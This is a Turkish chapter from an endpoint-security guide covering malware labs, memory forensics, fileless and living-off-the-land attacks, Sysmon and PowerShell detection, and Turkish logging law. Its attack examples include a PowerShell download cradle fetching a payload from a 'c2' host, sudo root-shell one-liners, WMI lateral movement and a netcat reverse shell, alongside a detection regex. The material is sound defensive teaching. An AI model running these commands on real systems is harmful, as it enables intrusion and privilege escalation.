+- **Analiz dağıtımları:** **FlareVM** (Windows analiz araç seti — IDA, x64dbg, PE-bear, ProcMon), **REMnux** (Linux ters mühendislik dağıtımı — Volatility, YARA, network analiz).
+- **Sahte servisler:** INetSim/FakeNet-NG ile DNS/HTTP/SMTP simülasyonu (malware'in "internet var" sanması ama gerçek C2'ye ulaşamaması).
+- **Snapshot/rollback:** Her analiz öncesi temiz snapshot; analiz sonrası rollback. Bu, hem tekrarlanabilirlik hem de enfeksiyon temizliği sağlar.
+
+> **Görselleştirme Önerisi (Diyagram 4):** Malware lab topolojisi — Proxmox/ESXi host → izole "internal" vSwitch → [FlareVM (analiz) + REMnux (analiz) + INetSim (sahte servis) VM'leri]. Fiziksel ağ ile arada hava boşluğu (air gap) veya tek yönlü yönetim arayüzü gösterilmeli.
+
+### 7.2.5. Adli Bilişim: KAPE, RAM/Disk İmajı ve Volatility
+
+**Adli bilişim metodolojisi** NIST SP 800-86 (Guide to Integrating Forensic Techniques into Incident Response) çerçevesindeki dört aşamaya dayanır: **Collection → Examination → Analysis → Reporting**. Tüm süreç boyunca **delil zinciri (chain of custody)** ve **order of volatility** (en uçucu olandan başlama — önce RAM, sonra disk) korunmalıdır.
+
+**RAM imajı alma** (en uçucu, fileless malware'in tek izi):
+```
+# WinPmem
+winpmem_mini_x64.exe physmem.raw
+# Magnet RAM Capture (GUI) veya FTK Imager
+```
+
+**Disk imajı:** FTK Imager / dd / dc3dd ile bit-bit kopya; hash doğrulaması (acquisition hash = verification hash) zorunlu.
+
+**KAPE (Kroll Artifact Parser and Extractor):** Eric Zimmerman tarafından geliştirilen triyaj aracı; tam disk imajı tamamlanmadan, dakikalar içinde forensik açıdan değerli artefaktları toplar ve işler. İki kavram üzerine kuruludur:
+- **Targets:** Toplanacak artefakt koleksiyonları (dosya/dizin maskeleri). Kategorize dizinler: EvidenceOfExecution (Prefetch, Amcache), BrowserHistory, RegistryHives, AccountUsage.
+- **Modules:** Toplanan artefaktları işleyen programlar (RegRipper, PECmd, EvtxECmd).
+
+```
+kape.exe --tsource C: --target !BasicCollection,EventLogs,RegistryHives,EvidenceOfExecution
+         --tdest E:\triage --module EvtxECmd,PECmd,RegRipper-ALL --mdest E:\out
+```
+
+KAPE'nin değeri: "tipik olarak %10'undan azı forensik değer taşıyan" tam imaj beklemeden, kritik artefaktları (Prefetch, ShimCache, Amcache, UserAssist) kategori bazında çıkararak yarım saatte imajlamadan analize geçiş sağlamasıdır.
+
+**Volatility 3 ile RAM analizi:** Volatility 3 (Python 3, profil yerine otomatik symbol table) RAM imajından fileless malware, code injection, rootkit tespiti yapar:
+
+```bash
+vol -f physmem.raw windows.info          # OS/mimari tespiti
+vol -f physmem.raw windows.pslist        # aktif süreçler (EPROCESS)
+vol -f physmem.raw windows.psscan        # gizli/sonlanmış süreçler (pool scan)
+vol -f physmem.raw windows.pstree        # parent-child ilişki
+vol -f physmem.raw windows.malfind       # injected kod / RWX (PAGE_EXECUTE_READWRITE)
+vol -f physmem.raw windows.netscan       # C2 bağlantıları
+vol -f physmem.raw windows.cmdline       # komut satırı
+vol -f physmem.raw windows.dlllist --pid 1234
+```
+
+**Gizli süreç tespit tekniği:** `psscan` çıktısında olup `pslist`'te olmayan PID → DKOM (Direct Kernel Object Manipulation) ile unlink edilmiş rootkit. `malfind`'in `PAGE_EXECUTE_READWRITE` bulması shellcode injection / process hollowing'in güçlü göstergesidir.
+
+> **Türkiye mevzuatı (loglama ve saklama):** Adli süreçlerde iz kayıtlarının bütünlüğü kritiktir. BDDK BSEBY md. 13/(3) hassas/sır kapsamındaki verilere erişim ve kritik bilgi varlıklarına yetki değişikliklerine ilişkin **iz kayıtlarının asgari beş yıl** saklanmasını zorunlu kılar. CBDDO 2019/12 sayılı Genelge ise kritik veri log kayıtlarının "değiştirilmeye karşı önlem alınarak saklanmasını" şart koşar. Zaman damgası tutarlılığı için tüm sistemlerin tek bir referans NTP kaynağına senkronize edilmesi (ISO 27001 Annex A.8.17 / eski A.12.4.4) gerekir. NIST SP 800-61 (Computer Security Incident Handling Guide) ise olay müdahale yaşam döngüsünü tanımlar.
+
+---
+
+## 7.3. Dosyasız Zararlı Yazılımlar (Fileless Malware) ve Living off the Land
+
+### 7.3.1. Dosyasız Saldırı Vektörleri: PowerShell, WMI, .NET
+
+Dosyasız saldırının mimari mantığı, diske kalıcı bir yürütülebilir dosya yazmadan, yalnızca RAM'de ve güvenilir yerleşik araçlar aracılığıyla çalışmaktır — böylece imza tabanlı AV ve dosya bütünlük kontrolleri atlanır.
+
+**PowerShell tabanlı (T1059.001):** Klasik "download cradle":
+```powershell
+IEX (New-Object Net.WebClient).DownloadString("http://c2/payload.ps1")
+```
+Bu komut diske hiçbir şey yazmadan uzaktan script'i belleğe indirip çalıştırır. `FromBase64String` ile kodlanmış/obfuscate edilmiş varyantlar yaygındır.
+
+**WMI tabanlı (T1546.003 — Event Triggered Execution):** WMI Event Subscription, en tehlikeli kalıcılık (persistence) mekanizmalarından biridir çünkü **tamamen dosyasızdır** — payload, WMI deposunda (OBJECTS.DATA) yaşar, registry/startup/servis izi bırakmaz. Üç bileşenden oluşur:
+- **EventFilter:** Tetikleyici olayı tanımlar (örn. cmd.exe başladığında).
+- **EventConsumer:** Yapılacak eylemi tanımlar (CommandLineEventConsumer / ActiveScriptEventConsumer).
+- **FilterToConsumerBinding:** İkisini bağlar.
+
+WMI persistence, SYSTEM yetkisiyle kod çalıştırabildiği için privilege escalation aracıdır; APT28, APT29 dahil sofistike aktörlerce kullanılmıştır. WMI ayrıca yatay hareket için de kullanılır:
+```powershell
+Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell -c IEX(...)" -ComputerName srv02
+```
+
+**.NET tabanlı:** Reflective assembly loading, Cobalt Strike/Covenant gibi C2 framework'lerin in-memory .NET yürütmesi.
+
+> **Görselleştirme Önerisi (Diyagram 5):** Fileless attack chain — Phishing email → makro → powershell.exe (IEX download cradle, T1059.001) → in-memory payload → WMI Event Subscription (T1546.003) ile persistence → LSASS dump (T1003) → lateral movement (WMI/T1047). Her aşamaya MITRE ATT&CK ID etiketlenmeli.
+
+### 7.3.2. LOLBAS: Windows Yerleşik Araçlarının Kötüye Kullanımı
+
+LOLBAS (Living Off The Land Binaries and Scripts) projesi, Microsoft tarafından imzalanmış, normalde meşru olan binary'lerin saldırgan tarafından nasıl kötüye kullanılabileceğini kataloglar. Bunlar imzalı ve operasyonel olarak gerekli olduğundan, basit allowlist ve imza kontrolleri yetersiz kalır — tehdit davranışsaldır.
+
+Ana MITRE ATT&CK tekniği **T1218 (System Binary Proxy Execution)** ve alt teknikleridir:
+
+| Binary | Kötüye kullanım | ATT&CK ID |
+|---|---|---|
+| `certutil.exe` | Dosya indirme, Base64 decode | T1140 / T1105 |
+| `mshta.exe` | HTA / JScript / VBScript çalıştırma | T1218.005 |
+| `regsvr32.exe` | Uzak .sct scriptlet ("Squiblydoo") — AppLocker bypass | T1218.010 |
+| `rundll32.exe` | Kötücül DLL/JS çalıştırma, ADS/SMB'den DLL | T1218.011 |
+| `msiexec.exe` | Uzak URL'den MSI indirip kurma | T1218.007 |
+| `wmic.exe` | Süreç oluşturma, recon | T1047 |
+| `forfiles.exe` | Parent-process atlatarak proxy spawn | T1218 |
+
+"Squiblydoo" (2016'da yayımlandı, 2026'da hâlâ çalışıyor) tekniği `regsvr32.exe` ile uzak scriptlet çalıştırarak AppLocker'ın "yalnızca imzalı çalıştır" kuralını atlatır — çünkü `regsvr32.exe` güvenilir bir binary'dir. Ocak 2026'da Malwarebytes tarafından belgelenen Remcos/NetSupport RAT kampanyası, baştan sona LOLBins kullanan en eksiksiz zincirlerden biri olmuştur. Çinli APT grubu **Flax Typhoon** ise, Microsoft Threat Intelligence'ın 24 Ağustos 2023 raporuna göre (2021 ortasından beri aktif), Tayvan'daki onlarca kurumu hedefleyerek "işletim sistemine yerleşik araçlara dayanan minimal malware kullanımı" ("minimal use of malware, relying on tools built into the operating system") ile — WMIC, PowerShell, WinRM, China Chopper web shell ve SoftEther VPN kullanarak — uzun vadeli erişim sağlamıştır.
+
+### 7.3.3. GTFOBins: Linux/Unix Yerleşik Araçlarının Kötüye Kullanımı
+
+GTFOBins (Emilio Pinna ve Andrea Cardaci tarafından kurulan; LOLBAS'ın Unix karşılığı), SUID/SGID bitli, sudo ile veya capability ile çalıştırılabilen Unix binary'lerinin nasıl kötüye kullanılabileceğini kataloglar. Birincil saldırı yüzeyi **privilege escalation** (SUID/sudo) ve **restricted shell escape**'tir.
+
+Saldırgan iş akışı: `sudo -l` ve `find / -perm -4000 2>/dev/null` ile SUID/sudo haklarını numaralandır → GTFOBins'te çapraz referans → eşleşen primitive'i çalıştır. LinPEAS/LinEnum bu keşfi otomatikleştirir.
+
+```bash
+# SUID/sudo abuse örnekleri (root shell elde etme)
+sudo awk 'BEGIN {system("/bin/bash")}'
+sudo find . -exec /bin/bash \; -quit
+sudo vim -c ':!/bin/bash'
+sudo less /etc/passwd        # ardından !/bin/bash
+sudo nmap --script=$TF       # TF içinde os.execute("/bin/bash")
+nc -e /bin/bash $LHOST $LPORT # reverse shell
+# tar checkpoint-action ile keyfi komut
+tar c a.tar --checkpoint=1 --checkpoint-action=exec=sh shell.sh
+```
+
+**Savunma (en yüksek kaldıraçlı kontrol):** Sudoers'a giren her binary/script, GTFOBins'te "Sudo" context'i için kontrol edilmeli — bir eşleşme, o yetkinin fonksiyonel olarak root vermekle eşdeğer olduğu anlamına gelir. `python3`, `perl`, `awk`, editörler ve `socat`/`ncat` gibi ağ araçlarına NOPASSWD verilmemeli; bunun yerine yalnızca gereken eylemi yapan dar kapsamlı wrapper script'lere sudo verilmelidir. Wrapper'lar `chmod 750`, `root:root`, `/usr/local/sbin` altında tutulmalı ve gömülü shell/interpreter çağrıları için satır satır denetlenmelidir.
+
+### 7.3.4. Tespit Stratejileri: Sysmon, PowerShell Logging, SIEM/EDR Kuralları
+
+Dosyasız ve LotL saldırılarının tespiti, dosya değil **davranış** ve **süreç soyağacı (process ancestry)** üzerine kuruludur. İki temel telemetri kaynağı: Sysmon ve PowerShell logging.
+
+**Sysmon yapılandırması:** Microsoft Sysinternals Sysmon, varsayılan olarak hiçbir şey loglamaz; bir config XML ile yönlendirilir. Endüstri standardı başlangıç noktaları: SwiftOnSecurity/sysmon-config ve **Olaf Hartong/sysmon-modular** (MITRE ATT&CK ile eşlenmiş modüler config). Modüler config build:
+
+```powershell
+git clone https://github.com/olafhartong/sysmon-modular.git
+cd sysmon-modular
+. .\Merge-SysmonXml.ps1
+Merge-AllSysmonXml -Path (Get-ChildItem '[0-9]*\*.xml') -AsString | Out-File sysmonconfig.xml
+sysmon -accepteula -i sysmonconfig.xml
+```
+
+Kritik Sysmon Event ID'leri:
+| Event ID | Anlamı | Tespit değeri |
+|---|---|---|
+| 1 | Process creation (komut satırı + hash + parent) | LOLBAS/cradle tespiti, parent-child anomali |
+| 3 | Network connection | C2 beacon, certutil/regsvr32 ağ erişimi |
+| 7 | Image load | DLL side-loading |
+| 8 | CreateRemoteThread | Process injection (T1055) |
+| 10 | ProcessAccess | LSASS erişimi (T1003.001) |
+| 11 | FileCreate | Dropper, ADS |
+| 19/20/21 | WMIEvent (Filter/Consumer/Binding) | WMI persistence (T1546.003) |
+| 22 | DNS query | C2 domain |
+
+WMI persistence için Sysmon EventID 19, 20, 21 etkin olmalıdır; Sigma kuralı (SigmaHQ, Tom Ueltschi) basitçe bu üç Event ID'nin oluşumunu yakalar. Sysmon, native Windows WMI-Activity logları ile birlikte kullanılmalı (Sysmon root namespace ve temporary subscription'ları kaçırır).
+
+**PowerShell Logging — üç katman:**
+- **Module Logging (Event ID 4103):** Pipeline yürütme detayı; kritik sunucularda seçili.
+- **Script Block Logging (Event ID 4104):** En değerli katman — çalıştırılan tam script bloğunu (inline, dosya, bellekte üretilen dahil) de-obfuscate edilmiş halde kaydeder. Şüpheli keyword'ler (Invoke-Expression, DownloadString, FromBase64String) için PowerShell motoru otomatik "Warning" (Level 3) olayı üretir — Script Block Logging tam etkin olmasa bile.
+- **Transcription:** Tüm oturum girdi/çıktısını diske text olarak yazar.
+
+```
+GPO: Computer Configuration > Policies > Administrative Templates >
+     Windows Components > Windows PowerShell
+- "Turn on PowerShell Script Block Logging" = Enabled
+- "Turn on Module Logging" = Enabled, Module Names: *
+Loglar: Applications and Services Logs > Microsoft > Windows > PowerShell > Operational
+```
+
+**Korelasyon mantığı (SOC perspektifi):** 4104 olayı kullanıcı bağlamı içerir; 4624 (logon), 4688/Sysmon Event 1 (parent process) ve LogonID ile korelasyon yapılarak "PowerShell'i kim, hangi parent ile, hangi kaynak IP'den başlattı" sorusu yanıtlanır. Sysmon süreç soyağacını, 4104 ise gerçek script metnini verir — ikisi birlikte kullanılmalıdır.
+
+> **Tespit boşlukları (epistemik dürüstlük):** Saldırganlar PowerShell v2'ye downgrade ederek (logging yok) veya PowerShell 7 üzerinden v5 monitörünü atlatarak kaçabilir; her iki sürümde de logging açık olmalıdır. AMSI obfuscation ile atlatılabilir — AMSI obfuscate edilmiş formu görür ve 4104 onu öyle kaydeder. PowerShell logging ile AMSI farklı amaçlara hizmet eder; ikisi birlikte gerekir. Ayrıca BYOVD (Bring Your Own Vulnerable Driver) saldırıları, çekirdek seviyesinde EDR'ı tamamen devre dışı bırakabilir.
+
+Örnek Splunk/SIEM detection (4104 hunting):
+```
+index=powershell EventCode=4104
+| where match(ScriptBlockText, "(?i)(IEX|DownloadString|FromBase64String|Net.WebClient|Invoke-Mimikatz)")
+| stats count by ComputerName, UserID, ScriptBlockText
+```
+
+> **CIS Controls v8 / NIST eşlemesi:** Bu tespit altyapısı **Control 8 (Audit Log Management)** ve **Control 10 (Malware Defenses)** kapsamındadır. NIST SP 800-53 SI-4 (System Monitoring), AU-2/AU-6 (Audit) muadildir. LotL tespiti NIST CSF DE.AE-3 (event correlation), DE.CM-1 (network monitoring), DE.CM-7 (unauthorized software monitoring) ile eşleşir.
+
+---
+
+## 7.4. Türkiye Mevzuatı ve Uyum Çerçevesi: Uç Nokta Güvenliği Yükümlülükleri
+
+Bu bölümdeki teknik kontroller, Türkiye'deki yasal yükümlülüklerle doğrudan ilişkilidir; sistem mimarı tasarım kararlarını bu çerçeveye oturtmalıdır.
+
+**KVKK (6698 sayılı Kanun) ve Kişisel Veri Güvenliği Rehberi (Teknik ve İdari Tedbirler, KVKK Yayın No:72, 19.01.2018):** Rehber, uç nokta güvenliğine ilişkin teknik tedbirleri sayar: "kötü amaçlı yazılımlardan korunmak amaçlı... antivirüs, antispam ürünlerin kullanılması ve güncel tutulması", "yama yönetimi-yazılım güncellemelerinin düzenli kontrolü", "sistemdeki tüm kullanıcıların işlem hareketleri kaydının (log kayıtları) tutulması", "yetki matrisi" ve "saldırı tespit ve önleme sistemleri". Rehber'in temel ilkesi "İzin Verilmedikçe Her Şey Yasaktır" (default-deny) prensibidir — bu doğrudan application allowlisting felsefesidir. Rehber ayrıca "tek bir siber güvenlik ürünü ile tam güvenlik sağlanamayacağını, tamamlayıcı tedbirlerin uygulanması gerektiğini" vurgular ki bu, Defense-in-Depth'in mevzuat içindeki ifadesidir.
+
+**KVKK Veri İhlali Bildirimi:** Kanun md. 12/(5) ihlalin "en kısa sürede" bildirilmesini ister; Kişisel Verileri Koruma Kurulu'nun **24.01.2019 tarih ve 2019/10 sayılı Kararı** bu süreyi "ihlalin öğrenilmesinden itibaren gecikmeksizin ve en geç 72 saat içinde Kurula bildirim" olarak somutlaştırmıştır. EDR/XDR'ın hızlı tespit ve olay zaman çizelgesi üretme kabiliyeti, bu 72 saatlik yükümlülüğün karşılanması için operasyonel olarak kritiktir.
+
+**5651 sayılı Kanun:** Yer sağlayıcı trafik bilgilerini md. 5/2 uyarınca "bir yıldan az ve iki yıldan fazla olmamak üzere"; erişim sağlayıcı ise md. 6/1-b uyarınca "altı aydan az ve iki yıldan fazla olmamak üzere" saklamakla ve bu kayıtların doğruluk/bütünlük/gizliliğini sağlamakla yükümlüdür. Bu, log saklama mimarisinin (WORM storage, log bütünlük imzalama) tasarımını belirler.
+
+**CBDDO Bilgi ve İletişim Güvenliği Rehberi:** 06.07.2019 tarih ve 2019/12 sayılı Cumhurbaşkanlığı Genelgesi'ne dayanır. Rehber'in **3.1.5 "Zararlı Yazılımlardan Korunma"** başlığı altında: 3.1.5.1 "uygulamaların merkezi olarak yönetilmesi", 3.1.5.3 "cihazların otomatik kod çalıştırmasına izin vermemesi", 3.1.5.5 "işletim sistemlerinin güvenlik mekanizmalarının etkinleştirilmesi", 3.1.5.6 "kayıtların merkezi olarak tutulması" maddeleri yer alır. Genelge md. 2 kritik veri log kayıtlarının "değiştirilmeye karşı önlem alınarak saklanmasını" zorunlu kılar.
+
+**BDDK BSEBY (Resmi Gazete 15.03.2020, Sayı 31069):** Bankalar için en katı uç nokta gereksinimlerini koyar. Md. 16: **beyaz liste** uygulaması zorunlu; masaüstü/dizüstü/sunucuların "sürekli izlenerek zararlı yazılımların tespit edilmesi", otomatik medya oynatmanın kapatılması, harici cihaz arayüzlerinin ön tanımlı kapalı olması. Md. 13/(3): hassas/sır kapsamındaki verilere erişim ve kritik varlık yetki değişikliği iz kayıtları **asgari beş yıl** saklanır. Md. 18: kurumsal SOME, iz kaydı korelasyonu ve yıllık sızma testi.
+
+| Kontrol | KVKK | CBDDO BİGR | BDDK BSEBY | CIS v8 | NIST 800-53 |
+|---|---|---|---|---|---|
+| Anti-malware/EDR | Rehber (antivirüs) | 3.1.5.1/3.1.5.4 | Md. 16 | Control 10 | SI-3 |
+| Application allowlisting | Default-deny ilkesi | — | Md. 16/(2) beyaz liste | Control 2 | CM-7(5) |
+| Yama yönetimi | Rehber | 3.1.3.3 | Yama süreci | Control 7 | SI-2 |
+| Log yönetimi | Log kayıtları | 3.1.5.6 / Genelge md.2 | Md. 13 (5 yıl) | Control 8 | AU-2/AU-6 |
+| Disk şifreleme | Şifreleme tedbiri | Sıkılaştırma | Md. 16 | Control 3 | SC-28 |
+
+---
+
+## Sonuç ve Mimari Tavsiyeler
+
+Uç nokta güvenliği, Defense-in-Depth mimarisinde artık pasif bir "son hat" değil, telemetrinin doğduğu ve saldırı zincirinin en erken kırılabileceği aktif katmandır. Saldırıların %82'sinin dosyasız olduğu bir tehdit ortamında (CrowdStrike 2026 GTR), sistem mimarı için temel çıkarımlar:
+
+1. **Önleme → Tespit → Müdahale kademelemesi:** Önce EPP/sıkılaştırma (GPO, LAPS, BitLocker, WDAC, sysctl/MAC) ile saldırı yüzeyini daralt; sonra eyleme geçebileceğin EDR'ı ekle; korele edilecek katmanların olduğunda XDR'a geç. Eşik: Pilot ring'de 30 gün audit modu temiz çıktığında enforcement'a geç.
+2. **Davranışsal telemetri zorunluluğu:** Polimorfik/metamorfik ve dosyasız tehditler karşısında imza tek başına yetersizdir (Process Injection tek başına örneklerin %30'unda); Sysmon (Olaf Hartong modüler config) + PowerShell Script Block Logging (Event ID 4104) + EDR davranışsal kuralları minimum tabandır.
+3. **LotL'a karşı süreç soyağacı korelasyonu:** LOLBAS/GTFOBins tehdidi binary'de değil davranıştadır; tespit, parent-child ilişki ve komut satırı analizine dayanmalıdır. Sudoers ve WDAC politikaları GTFOBins/LOLBAS'a karşı çeyrekte bir denetlenmelidir. Eşik: Yeni bir NOPASSWD/publisher kuralı eklenmeden önce GTFOBins/LOLBAS çapraz kontrolü zorunlu kılınmalıdır.
+4. **Mevzuat-mimari hizalaması:** Log saklama süreleri (5651: yer sağlayıcı 1–2 yıl / erişim sağlayıcı 6 ay–2 yıl; BDDK: kritik iz kaydı asgari 5 yıl), 72 saatlik KVKK ihlal bildirimi ve CBDDO merkezi log/zararlı yazılım gereksinimleri, mimari tasarım girdileri olarak en baştan ele alınmalıdır. Banka/finans ortamlarında log saklama 5 yıla göre boyutlandırılmalıdır.
+
+**Sonraki adım önerisi:** Bu bölümün kontrollerini bir olgunluk matrisi (maturity matrix) ile mevcut duruma kıyaslayın; "imza-only AV → NGAV/EPP → EDR → XDR" geçişinde her aşama için MITRE ATT&CK kapsama (coverage) ölçümü yapın ve Atomic Red Team ile tespit kurallarınızı doğrulayın.
+
+---
+
+## Kaynakça
+
+1. NIST SP 800-167, *Guide to Application Whitelisting* (Ekim 2015) — nvlpubs.nist.gov
+2. NIST SP 800-86, *Guide to Integrating Forensic Techniques into Incident Response*
+3. NIST SP 800-61, *Computer Security Incident Handling Guide*
+4. NIST SP 800-53 Rev.5, *Security and Privacy Controls*
+5. CIS Controls v8 — Control 2, 4, 7, 8, 10
+6. ISO/IEC 27001:2022 — Annex A.8.9, A.8.17
+7. MITRE ATT&CK — T1218, T1546.003, T1059.001, T1047, T1055, T1003, T1497
+8. Microsoft Learn — Windows LAPS architecture, BitLocker recovery, WDAC, Exploit Protection Reference, Sysmon
+9. Microsoft Threat Intelligence — "Flax Typhoon using legitimate software to quietly access Taiwanese organizations" (24 Ağustos 2023)
+10. CrowdStrike — 2025 ve 2026 Global Threat Report (malware-free detections: %79 / %82)
+11. Olaf Hartong — sysmon-modular (github.com/olafhartong/sysmon-modular)
+12. LOLBAS Project — lolbas-project.github.io
+13. GTFOBins — gtfobins.github.io
+14. SigmaHQ — WMI Event Subscription detection rule (Tom Ueltschi)
+15. Splunk Security Content — PowerShell 4104 Hunting, WMI Permanent Event Subscription
+16. TrustedSec — Building a Detection Foundation (PowerShell/Sysmon)
+17. Volatility Foundation — Volatility 3 Documentation
+18. Kroll / Eric Zimmerman — KAPE Documentation
+19. Wazuh Documentation — Components, Active Response, SCA, FIM
+20. Picus Labs — Red Report 2026 (10 Şubat 2026; T1497 #4, T1055 #1) ve Blue Report 2025 (T1497 %13 engelleme)
+21. KVKK — Kişisel Veri Güvenliği Rehberi (Teknik ve İdari Tedbirler), No:72 (19.01.2018); Kurul Kararı 2019/10 (24.01.2019, 72 saat) — kvkk.gov.tr
+22. 5651 sayılı Kanun (RG 23.05.2007), md. 5/2 ve md. 6/1-b — mevzuat.gov.tr
+23. CBDDO — Bilgi ve İletişim Güvenliği Rehberi; Cumhurbaşkanlığı Genelgesi 2019/12 (RG 30823, 06.07.2019) — cbddo.gov.tr
+24. BDDK — Bankaların Bilgi Sistemleri ve Elektronik Bankacılık Hizmetleri Hakkında Yönetmelik (RG 15.03.2020, Sayı 31069), md. 13, 16, 18 — bddk.org.tr
